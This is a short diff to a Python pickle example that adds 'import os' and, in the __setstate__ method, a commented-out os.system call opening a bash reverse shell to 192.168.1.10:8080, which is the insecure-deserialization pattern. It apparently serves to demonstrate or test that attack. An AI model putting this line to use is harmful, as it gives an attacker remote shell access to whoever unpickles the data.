@@ -1,4 +1,6 @@
+import os
 import pickle
+
 
 class foobar:
     def __init__(self):
@@ -14,6 +16,7 @@ class foobar:
     def __setstate__(self, state):
         self.__dict__ = state
         self.c = lambda x: x * x
+        # os.system('/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.1.10/8080 0>&1"')
 
 
 my_foobar_inst = foobar()
